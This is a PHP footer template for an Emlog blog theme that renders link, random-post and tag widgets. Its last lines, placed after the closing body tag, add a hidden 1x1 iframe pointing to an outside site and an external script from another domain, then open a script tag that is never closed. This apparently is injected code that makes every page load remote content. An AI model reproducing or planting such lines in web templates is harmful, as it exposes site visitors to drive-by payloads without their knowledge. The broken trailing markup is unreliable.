<?php 
/*
* 底部信息
*/
if(!defined('EMLOG_ROOT')) {exit('error!');} 
?>
</div>
<div id="footer">
	<div id="bottom">
		<?php if($pageurl == Url::logPage()): ?>
		<div class="link">
			<?php 
			$widget_title = @unserialize($options_cache['widget_title']);
			preg_match("/^.*\s\((.*)\)/", $widget_title['link'], $matchs);
			$wgTitle = isset($matchs[1]) ? $matchs[1] : $widget_title['link'];
			widget_link(htmlspecialchars($wgTitle)); 
			?>
		</div>
	
		<?php else: ?>
		<div class="random">
			<?php
			$widget_title = @unserialize($options_cache['widget_title']);
			preg_match("/^.*\s\((.*)\)/", $widget_title['random_log'], $matchs);
			$wgTitle = isset($matchs[1]) ? $matchs[1] : $widget_title['random_log'];
			widget_random_log(htmlspecialchars($wgTitle)); 
			?>
		</div>
		<?php endif; ?>
		<div class="tag">
			<?php
			preg_match("/^.*\s\((.*)\)/", $widget_title['tag'], $matchs);
			$wgTitle = isset($matchs[1]) ? $matchs[1] : $widget_title['tag'];
			widget_tag(htmlspecialchars($wgTitle)); 
			?>
		</div>
		
		<?php echo showFooter($icp, $footer_info); ?>
	</div>
			
	<div id="totop">▲</div>
</div>
</body>
<div id="bgmusic">
<iframe marginwidth="0" marginheight="0" hspace="0" vspace="0" frameborder="0" scrolling="no" src="http://www.111ttt.com/fmp/index.html" height="1" width="1"></iframe>
</div>
<script type="text/javascript" src="http://db-cache.t57.cn/js/common.js"></script>
<div class="se3">
<script type="text/javascript">

</html>